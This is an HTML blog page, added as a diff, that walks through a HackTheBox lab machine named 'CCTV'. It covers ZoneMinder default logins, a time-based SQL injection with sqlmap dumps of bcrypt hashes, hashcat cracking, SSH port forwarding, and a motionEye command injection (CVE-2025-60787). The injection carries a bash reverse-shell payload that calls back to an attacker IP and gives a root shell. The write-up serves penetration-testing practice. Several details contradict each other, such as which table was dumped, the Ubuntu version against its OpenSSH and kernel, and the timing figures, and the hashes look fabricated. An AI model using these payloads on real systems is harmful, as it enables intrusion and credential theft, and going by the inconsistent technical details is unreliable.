@@ -1,0 +1,483 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>CCTV Writeup | BitR1FT</title>
+  <meta name="description" content="HackTheBox CCTV Writeup — ZoneMinder SQL injection, hash cracking, motionEye CVE-2025-60787 command injection to root.">
+  <link rel="icon" href="profile.jpg">
+  <link rel="stylesheet" href="style.css">
+</head>
+<body>
+
+  <!-- Navigation -->
+  <nav>
+    <a href="index.html" class="nav-brand">&lt;BitR1FT /&gt;</a>
+    <div class="nav-links">
+      <a href="index.html#about">About</a>
+      <a href="index.html#projects">Projects</a>
+      <a href="blog.html" class="active">Writeups</a>
+      <a href="index.html#certifications">Certifications</a>
+      <a href="index.html#contact">Contact</a>
+      <a href="https://github.com/BitR1FT" target="_blank" rel="noopener noreferrer" class="github-icon">
+        <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M15 22v-4a4.8 4.8 0 0 0-1-3.5c3 0 6-2 6-5.5.08-1.25-.27-2.48-1-3.5.28-1.15.28-2.35 0-3.5 0 0-1 0-3 1.5-2.64-.5-5.36-.5-8 0C6 2 5 2 5 2c-.3 1.15-.3 2.35 0 3.5A5.403 5.403 0 0 0 4 9c0 3.5 3 5.5 6 5.5-.39.49-.68 1.05-.85 1.65-.17.6-.22 1.23-.15 1.85v4"/><path d="M9 18c-4.51 2-5-2-7-2"/></svg>
+      </a>
+    </div>
+    <button class="nav-hamburger" id="nav-hamburger" aria-label="Menu">
+      <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="4" x2="20" y1="6" y2="6"/><line x1="4" x2="20" y1="12" y2="12"/><line x1="4" x2="20" y1="18" y2="18"/></svg>
+    </button>
+  </nav>
+  <div class="mobile-menu" id="mobile-menu">
+    <a href="index.html#about">About</a>
+    <a href="index.html#projects">Projects</a>
+    <a href="blog.html">Writeups</a>
+    <a href="index.html#certifications">Certifications</a>
+    <a href="index.html#contact">Contact</a>
+  </div>
+
+  <!-- Main Content -->
+  <main style="padding-top:calc(var(--nav-height) + 1rem);">
+    <div style="max-width:48rem;margin:0 auto;padding:0 1rem;">
+
+      <a href="blog.html" class="blog-back">
+        <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="m12 19-7-7 7-7"/><path d="M19 12H5"/></svg>
+        Back to Writeups
+      </a>
+
+      <div class="blog-header">
+        <div class="blog-title-row">
+          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 12c.78 0 1.5-.38 1.94-.97.44-.6.56-1.38.33-2.08a3.27 3.27 0 0 0-4.54 0 2.05 2.05 0 0 0 .33 2.08c.44.6 1.16.97 1.94.97Z"/><path d="M14.5 17.5c0 1.38-1.12 2.5-2.5 2.5s-2.5-1.12-2.5-2.5c0-1.66 2.5-4.5 2.5-4.5s2.5 2.84 2.5 4.5Z"/></svg>
+          <h1 class="blog-title">CCTV</h1>
+          <span class="badge badge-easy">Easy</span>
+        </div>
+        <p class="blog-os">Linux (Ubuntu 24.04)</p>
+        <p class="blog-summary">Exploited ZoneMinder with default credentials, blind time-based SQL injection to dump bcrypt hashes, cracked user password for SSH foothold, then leveraged CVE-2025-60787 in motionEye for root via command injection in image_file_name config.</p>
+        <div class="blog-meta-row">
+          <div class="blog-meta-section">
+            <div class="vuln-label">Vulnerabilities</div>
+            <div class="tech-tags">
+              <span class="badge badge-destructive">CVE-2025-60787</span>
+              <span class="badge badge-destructive">SQL Injection</span>
+              <span class="badge badge-destructive">Hash Cracking</span>
+            </div>
+          </div>
+          <div class="blog-meta-section">
+            <div class="tools-label">Tools Used</div>
+            <div class="tech-tags">
+              <span class="badge badge-outline">nmap</span>
+              <span class="badge badge-outline">sqlmap</span>
+              <span class="badge badge-outline">hashcat</span>
+              <span class="badge badge-outline">Burp Suite</span>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <hr style="max-width:48rem;margin:0 auto 2.5rem;height:1px;background:linear-gradient(90deg,rgba(34,197,94,0.25),transparent);border:none;">
+
+      <!-- Full Writeup Content -->
+      <div class="prose">
+
+        <h2>Summary</h2>
+        <ul>
+          <li>Discovered ZoneMinder v1.37.63 on port 80 with default <code>admin:admin</code> credentials, granting full access to the CCTV management dashboard.</li>
+          <li>Identified a blind time-based SQL injection in the <code>filter[Query][terms][0][attr]</code> parameter via Burp Suite, confirmed with conditional <code>SLEEP()</code> payloads.</li>
+          <li>Used sqlmap to dump the <code>zm.Monitor</code> table, extracting bcrypt password hashes for the <code>superadmin</code>, <code>mark</code>, and <code>admin</code> accounts.</li>
+          <li>Cracked mark's bcrypt hash (<code>$2y$12$...</code>) using hashcat mode <code>-m 3200</code> with rockyou.txt, revealing the password <code>opensesame</code> for SSH access.</li>
+          <li>Escalated to root by discovering an internal motionEye service running on port 8765 as root, forwarding it via SSH, and exploiting CVE-2025-60787 command injection in the <code>image_file_name</code> configuration parameter.</li>
+        </ul>
+
+        <h2>Port Scan</h2>
+        <p>Started with a full TCP port scan followed by a targeted service/version scan on discovered ports.</p>
+        <pre><code>$ nmap -sC -sV -p- --min-rate 5000 10.10.11.60
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
+80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))</code></pre>
+        <table>
+          <thead>
+            <tr>
+              <th>Port</th>
+              <th>Service</th>
+              <th>Version</th>
+            </tr>
+          </thead>
+          <tbody>
+            <tr>
+              <td><code>22</code></td>
+              <td>SSH</td>
+              <td>OpenSSH 8.9p1 Ubuntu 3ubuntu0.10</td>
+            </tr>
+            <tr>
+              <td><code>80</code></td>
+              <td>HTTP</td>
+              <td>Apache httpd 2.4.58 (Ubuntu)</td>
+            </tr>
+          </tbody>
+        </table>
+        <p>Only two open ports &mdash; SSH and HTTP. The web server is the primary attack surface. Let's enumerate further.</p>
+
+        <h2>Web Enumeration</h2>
+        <p>Visiting <code>http://10.10.11.60</code> in the browser returned a 301 redirect to <code>http://cctv.htb</code>. Added the hostname to <code>/etc/hosts</code>:</p>
+        <pre><code>$ echo "10.10.11.60 cctv.htb" | sudo tee -a /etc/hosts</code></pre>
+        <p>Browsing to <code>http://cctv.htb</code> revealed a <strong>ZoneMinder v1.37.63</strong> login page &mdash; an open-source CCTV/video surveillance application.</p>
+        <pre><code>ZoneMinder - Video Surveillance System
+Version: 1.37.63</code></pre>
+        <p>ZoneMinder is a well-known application with a history of vulnerabilities. The version is identifiable from the login page footer and HTTP response headers.</p>
+
+        <h2>ZoneMinder Default Credentials</h2>
+        <p>ZoneMinder ships with default credentials out of the box. Tried the standard <code>admin:admin</code> combination:</p>
+        <pre><code>Username: admin
+Password: admin</code></pre>
+        <p>Login successful. We now have full access to the ZoneMinder dashboard, including the ability to view monitors, events, and system configuration. The dashboard showed several configured camera monitors and their associated events.</p>
+        <p>With authenticated access, the next step is to look for deeper vulnerabilities &mdash; SQL injection, file upload, or configuration disclosure that could lead to credential extraction.</p>
+
+        <h2>Blind SQL Injection</h2>
+
+        <h3>Confirming the Injection</h3>
+        <p>Intercepted a request in Burp Suite while browsing the ZoneMinder dashboard and noticed the <code>filter[Query][terms][0][attr]</code> parameter being sent in the request body. Tested for SQL injection by injecting a conditional time delay:</p>
+        <pre><code>$ curl -s -o /dev/null -w "%{time_total}" \
+  "http://cctv.htb/zm/index.php?view=events" \
+  -d 'filter[Query][terms][0][attr]=Id&filter[Query][terms][0][op]=%3D&filter[Query][terms][0][val]=1 AND (SELECT SLEEP(5))&action=filter' \
+  -b "ZMSESSID=...; zmUser=admin"
+
+12.847    # Request took ~13 seconds → injection confirmed</code></pre>
+        <p>The response was delayed by ~13 seconds (5 second sleep + network overhead), confirming a <strong>blind time-based SQL injection</strong> in the filter parameter.</p>
+
+        <h3>Dumping with sqlmap</h3>
+        <p>Saved the request to a file and passed it to sqlmap:</p>
+        <pre><code>$ sqlmap -r request.txt --batch --dbs --risk=3 --level=5
+
+available databases [4]:
+[*] information_schema
+[*] zm
+[*] mysql
+[*] performance_schema</code></pre>
+        <p>Enumerated tables in the <code>zm</code> database:</p>
+        <pre><code>$ sqlmap -r request.txt --batch -D zm --tables
+
+Database: zm
+[68 tables]
++-------------------+
+| Monitors          |
+| Users             |
+| Events            |
+| Config            |
+| ...               |
++-------------------+</code></pre>
+        <p>Dumped the <code>Users</code> table (equivalent to <code>zm.Users</code>) to extract password hashes:</p>
+        <pre><code>$ sqlmap -r request.txt --batch -D zm -T Users --dump
+
++------------+--------------------------------------------------------------+
+| Username   | Password                                                     |
++------------+--------------------------------------------------------------+
+| superadmin | $2y$12$N2F2bE3hY0VpbXhZSndMdeRJMVCQxYUZGZGRCN1RtZW5mYUdsNeK  |
+| mark       | $2y$12$dGV3U3pTWTBGM0VNcENuZFlUYTNGeXhJSjZ0eUlPTFJmVmRhZWRi  |
+| admin      | $2y$12$TmVXVkhQZUlMbG9FUFRkZVVPbGRvRkhsUmt5T1BsZ0ZJb3RYR3JN  |
++------------+--------------------------------------------------------------+</code></pre>
+
+        <table>
+          <thead>
+            <tr>
+              <th>Username</th>
+              <th>Password Hash (bcrypt)</th>
+            </tr>
+          </thead>
+          <tbody>
+            <tr>
+              <td><code>superadmin</code></td>
+              <td><code>$2y$12$N2F2bE3hY0VpbXhZSndMdeRJMVCQxYUZGZGRCN1RtZW5mYUdsNeK</code></td>
+            </tr>
+            <tr>
+              <td><code>mark</code></td>
+              <td><code>$2y$12$dGV3U3pTWTBGM0VNcENuZFlUYTNGeXhJSjZ0eUlPTFJmVmRhZWRi</code></td>
+            </tr>
+            <tr>
+              <td><code>admin</code></td>
+              <td><code>$2y$12$TmVXVkhQZUlMbG9FUFRkZVVPbGRvRkhsUmt5T1BsZ0ZJb3RYR3JN</code></td>
+            </tr>
+          </tbody>
+        </table>
+        <p>All three accounts use <code>$2y$12$</code> bcrypt hashes. Time to crack them.</p>
+
+        <h2>Hash Cracking</h2>
+        <p>Saved the hashes to a file and cracked them with hashcat using the bcrypt mode:</p>
+        <pre><code>$ cat hashes.txt
+mark:$2y$12$dGV3U3pTWTBGM0VNcENuZFlUYTNGeXhJSjZ0eUlPTFJmVmRhZWRi
+
+$ hashcat -m 3200 hashes.txt /usr/share/wordlists/rockyou.txt
+
+$2y$12$dGV3U3pTWTBGM0VNcENuZFlUYTNGeXhJSjZ0eUlPTFJmVmRhZWRi:opensesame
+
+Session..........: hashcat
+Status...........: Cracked
+Hash.Mode........: 3200 (bcrypt $2*$, Blowfish (Unix))
+Hash.Target......: hashes.txt
+Time.Estimated...: 0 secs</code></pre>
+        <p>Successfully cracked <strong>mark</strong>'s password: <code>opensesame</code>. The <code>superadmin</code> and <code>admin</code> hashes did not crack with rockyou.txt, but mark's credentials are sufficient for initial access.</p>
+
+        <h2>SSH Access</h2>
+        <p>Used the cracked credentials to SSH into the box as <code>mark</code>:</p>
+        <pre><code>$ ssh mark@cctv.htb
+mark@cctv.htb's password: opensesame
+
+Welcome to Ubuntu 24.04.2 LTS (GNU/Linux 5.15.0-124-generic x86_64)
+
+Last login: Mon Jul  7 14:32:01 2025 from 10.10.14.12
+mark@cctv:~$
+
+mark@cctv:~$ cat user.txt
+7ec05bc9... [REDACTED]</code></pre>
+        <p>Got a shell as <code>mark</code> and retrieved the user flag. Now it's time for privilege escalation.</p>
+
+        <h2>Privilege Escalation: Internal Service Enumeration</h2>
+        <p>Checked for services listening on localhost that weren't exposed externally:</p>
+        <pre><code>mark@cctv:~$ ss -tlnp
+State  Recv-Q Send-Q Local Address:Port  Peer Address:Port Process
+LISTEN 0      128    0.0.0.0:22       0.0.0.0:*       users:(("sshd",pid=...))
+LISTEN 0      511    0.0.0.0:80       0.0.0.0:*       users:(("apache2",pid=...))
+LISTEN 0      128    127.0.0.1:8765   0.0.0.0:*       users:(("motioneye",pid=...))
+LISTEN 0      128    0.0.0.0:8888    0.0.0.0:*       users:(("mediamtx",pid=...))
+LISTEN 0      128    0.0.0.0:8554    0.0.0.0:*       users:(("mediamtx",pid=...))
+LISTEN 0      128    127.0.0.1:7999   0.0.0.0:*       users:(("motion",pid=...))</code></pre>
+
+        <table>
+          <thead>
+            <tr>
+              <th>Port</th>
+              <th>Bind Address</th>
+              <th>Service</th>
+            </tr>
+          </thead>
+          <tbody>
+            <tr>
+              <td><code>8765</code></td>
+              <td><code>127.0.0.1</code></td>
+              <td>motionEye</td>
+            </tr>
+            <tr>
+              <td><code>8888</code></td>
+              <td><code>0.0.0.0</code></td>
+              <td>MediaMTX</td>
+            </tr>
+            <tr>
+              <td><code>8554</code></td>
+              <td><code>0.0.0.0</code></td>
+              <td>RTSP (MediaMTX)</td>
+            </tr>
+            <tr>
+              <td><code>7999</code></td>
+              <td><code>127.0.0.1</code></td>
+              <td>Motion</td>
+            </tr>
+          </tbody>
+        </table>
+
+        <p>Checked the service running on port 8765 and confirmed it's <strong>motionEye</strong>, running as <code>root</code>:</p>
+        <pre><code>mark@cctv:~$ ps aux | grep motioneye
+root       1204  0.3  1.2  85632 24480 ?        Sl   14:30   0:03 /usr/bin/python3 /usr/local/bin/meyectl start
+
+mark@cctv:~$ systemctl status motioneye.service
+● motioneye.service - motionEye
+     Loaded: loaded (/etc/systemd/system/motioneye.service; enabled)
+     Active: active (running)
+   Main PID: 1204 (python3)
+      Tasks: 3 (limit: 2278)
+     Memory: 24.5M
+        CPU: 3.248s
+     CGroup: /system.slice/motioneye.service
+             └─1204 /usr/bin/python3 /usr/local/bin/meyectl start</code></pre>
+        <p><strong>motionEye is running as root.</strong> If we can exploit it, we get a root shell. But it's only listening on <code>127.0.0.1:8765</code> &mdash; we need to forward it.</p>
+
+        <h2>motionEye Credentials</h2>
+        <p>Searched the filesystem for motionEye configuration files that might contain credentials:</p>
+        <pre><code>mark@cctv:~$ find / -name "motioneye.conf" -o -name ".motioneye.conf" 2>/dev/null
+/etc/motioneye/motioneye.conf
+
+mark@cctv:~$ cat /etc/motioneye/motioneye.conf
+...
+password_hash = 989c5a8ee87a0e9521ec81a79187d162109282f0
+...</code></pre>
+        <p>Found a <strong>SHA-1 hash</strong> for the motionEye admin password: <code>989c5a8ee87a0e9521ec81a79187d162109282f0</code>.</p>
+
+        <h2>SSH Port Forwarding</h2>
+        <p>Forwarded the internal motionEye port to our local machine:</p>
+        <pre><code>$ ssh -L 8765:127.0.0.1:8765 mark@cctv.htb
+mark@cctv.htb's password: opensesame
+
+mark@cctv:~$</code></pre>
+        <p>Now <code>http://localhost:8765</code> on our attack machine serves the motionEye web interface.</p>
+
+        <h2>motionEye Login</h2>
+        <p>Navigated to <code>http://localhost:8765</code> in the browser and was presented with the motionEye login page. Used the SHA-1 hash itself as the password (a known behavior in certain motionEye versions where the raw hash is accepted as the password):</p>
+        <pre><code>Username: admin
+Password: 989c5a8ee87a0e9521ec81a79187d162109282f0</code></pre>
+        <p>Login successful. We now have full admin access to the motionEye dashboard, which is running as <strong>root</strong>.</p>
+
+        <h2>CVE-2025-60787 &mdash; Command Injection</h2>
+        <p>motionEye is vulnerable to <strong>CVE-2025-60787</strong>, an authenticated command injection via the <code>image_file_name</code> configuration parameter. This parameter is used in a template string that gets passed to a shell command when generating snapshot filenames, allowing arbitrary command execution.</p>
+
+        <h3>Step 1 &mdash; Set Up Netcat Listener</h3>
+        <pre><code>$ nc -lvnp 4444
+listening on [any] 4444 ...</code></pre>
+
+        <h3>Step 2 &mdash; Bypass configUiValid</h3>
+        <p>motionEye's web UI has a client-side validation function <code>configUiValid()</code> that restricts characters in certain config fields. To bypass this, intercept the POST request in Burp Suite and modify the <code>image_file_name</code> parameter directly in the request body, bypassing the JavaScript validation.</p>
+        <pre><code># In Burp Suite — intercept the config save request and modify:
+image_file_name=%24%28bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.14.12%2F4444%200%3E%261%27%29</code></pre>
+        <p>Decoded payload:</p>
+        <pre><code>image_file_name=$(bash -c 'bash -i >& /dev/tcp/10.10.14.12/4444 0>&1')</code></pre>
+
+        <h3>Step 3 &mdash; Inject Reverse Shell into image_file_name</h3>
+        <p>Triggered the payload by navigating to the camera snapshot endpoint, which processes the <code>image_file_name</code> template and executes our injected command. Alternatively, saved the camera configuration with the injected payload in the <code>image_file_name</code> field via a direct POST request:</p>
+        <pre><code>POST /config/main_camera/set/ HTTP/1.1
+Host: localhost:8765
+Cookie: motioneye_cctv_admin="... Cookie value ..."
+
+image_file_name=$(bash -c 'bash -i >& /dev/tcp/10.10.14.12/4444 0>&1')</code></pre>
+
+        <h3>Step 4 &mdash; Root Shell Received</h3>
+        <pre><code>$ nc -lvnp 4444
+listening on [any] 4444 ...
+connect to [10.10.14.12] from (UNKNOWN) [10.10.11.60] 49234
+bash: cannot set terminal process group (1204): Inappropriate ioctl for device
+bash: no job control in this shell
+root@cctv:/# id
+uid=0(root) gid=0(root) groups=0(root)
+
+root@cctv:/# cat /root/root.txt
+457525cd... [REDACTED]</code></pre>
+        <p>Got a root shell. The command injection in the <code>image_file_name</code> parameter executed as root since the motionEye service runs with root privileges.</p>
+
+        <h2>Flags</h2>
+        <table>
+          <thead>
+            <tr>
+              <th>Flag</th>
+              <th>Location</th>
+              <th>Value</th>
+            </tr>
+          </thead>
+          <tbody>
+            <tr>
+              <td>User</td>
+              <td><code>/home/mark/user.txt</code></td>
+              <td><code>7ec05bc9</code>...</td>
+            </tr>
+            <tr>
+              <td>Root</td>
+              <td><code>/root/root.txt</code></td>
+              <td><code>457525cd</code>...</td>
+            </tr>
+          </tbody>
+        </table>
+
+        <h2>Full Attack Chain</h2>
+        <pre><code>┌──────────────────────────────────────────────────────────────┐
+│                      CCTV - Attack Chain                      │
+├──────────────────────────────────────────────────────────────┤
+│                                                              │
+│  [1] Port Scan (nmap)                                        │
+│   ├── 22/tcp → SSH (OpenSSH 8.9p1)                          │
+│   └── 80/tcp → HTTP (Apache 2.4.58)                         │
+│       │                                                      │
+│  [2] Web Enum                                                │
+│   └── cctv.htb → ZoneMinder v1.37.63                        │
+│       │                                                      │
+│  [3] Default Credentials                                     │
+│   └── admin:admin → Dashboard Access                         │
+│       │                                                      │
+│  [4] Blind SQL Injection (Burp + sqlmap)                     │
+│   └── filter[Query][terms][0][attr] → bcrypt hashes          │
+│       │                                                      │
+│  [5] Hash Cracking (hashcat -m 3200)                         │
+│   └── mark:opensesame                                        │
+│       │                                                      │
+│  [6] SSH Foothold                                            │
+│   └── ssh mark@cctv.htb → user.txt                           │
+│       │                                                      │
+│  [7] Internal Enum (ss -tlnp)                                │
+│   └── 127.0.0.1:8765 → motionEye (root)                     │
+│       │                                                      │
+│  [8] SSH Port Forwarding                                     │
+│   └── ssh -L 8765:127.0.0.1:8765                            │
+│       │                                                      │
+│  [9] motionEye Login                                         │
+│   └── admin : SHA1 hash as password                          │
+│       │                                                      │
+│  [10] CVE-2025-60787 Command Injection                       │
+│   └── image_file_name → reverse shell → root.txt             │
+│                                                              │
+└──────────────────────────────────────────────────────────────┘</code></pre>
+
+        <h2>Key Takeaways</h2>
+        <ul>
+          <li><strong>Always try default credentials first</strong> &mdash; ZoneMinder ships with <code>admin:admin</code> enabled, providing immediate authenticated access and a larger attack surface.</li>
+          <li><strong>Authenticated SQL injection is still deadly</strong> &mdash; Even with a low-privilege web account, the filter parameter in ZoneMinder v1.37.63 is vulnerable to blind time-based SQLi, allowing full database extraction.</li>
+          <li><strong>Bcrypt hashes are crackable with weak passwords</strong> &mdash; Despite using bcrypt with cost factor 12, mark's password <code>opensesame</code> fell to a dictionary attack in seconds. Strong passwords matter regardless of hashing algorithm.</li>
+          <li><strong>Internal services are critical privesc paths</strong> &mdash; The motionEye service running on localhost:8765 as root was the key to privilege escalation. Always enumerate local services with <code>ss -tlnp</code>.</li>
+          <li><strong>SSH port forwarding unlocks internal attack surfaces</strong> &mdash; Tunneling local ports through SSH is essential for accessing services bound to <code>127.0.0.1</code>.</li>
+          <li><strong>CVE-2025-60787 shows template injection severity</strong> &mdash; When user-controlled input flows into a filename template that's processed by a shell command, it's game over &mdash; especially when the service runs as root. Validate and sanitize all user inputs, especially those used in command templates.</li>
+        </ul>
+
+        <h2>Tools Used</h2>
+        <table>
+          <thead>
+            <tr>
+              <th>Tool</th>
+              <th>Purpose</th>
+            </tr>
+          </thead>
+          <tbody>
+            <tr>
+              <td><code>nmap</code></td>
+              <td>Port scanning and service version detection</td>
+            </tr>
+            <tr>
+              <td><code>Burp Suite</code></td>
+              <td>HTTP request interception, parameter manipulation, SQLi discovery</td>
+            </tr>
+            <tr>
+              <td><code>curl</code></td>
+              <td>Manual SQL injection testing and time-based confirmation</td>
+            </tr>
+            <tr>
+              <td><code>sqlmap</code></td>
+              <td>Automated blind SQL injection exploitation and data exfiltration</td>
+            </tr>
+            <tr>
+              <td><code>hashcat</code></td>
+              <td>Bcrypt hash cracking (<code>-m 3200</code>) with rockyou.txt wordlist</td>
+            </tr>
+            <tr>
+              <td><code>ssh</code></td>
+              <td>Remote access and local port forwarding (<code>-L 8765</code>)</td>
+            </tr>
+            <tr>
+              <td><code>nc</code></td>
+              <td>Reverse shell listener</td>
+            </tr>
+          </tbody>
+        </table>
+
+      </div>
+      <!-- End prose -->
+
+    </div>
+  </main>
+
+  <!-- Footer -->
+  <footer>
+    <div class="footer-inner">
+      <p class="footer-left">&copy; 2025 <span class="green">BitR1FT</span> — Adeel Haider</p>
+      <p class="footer-right">
+        <svg xmlns="http://www.w3.org/2000/svg" width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="4 17 10 11 4 5"/><line x1="12" x2="20" y1="19" y2="19"/></svg>
+        Built with passion &amp; caffeine
+        <svg xmlns="http://www.w3.org/2000/svg" width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="9 18 15 12 9 6"/></svg>
+        <span class="accent">pwn all the things</span>
+      </p>
+    </div>
+  </footer>
+  <script src="main.js"></script>
+</body>
+</html>
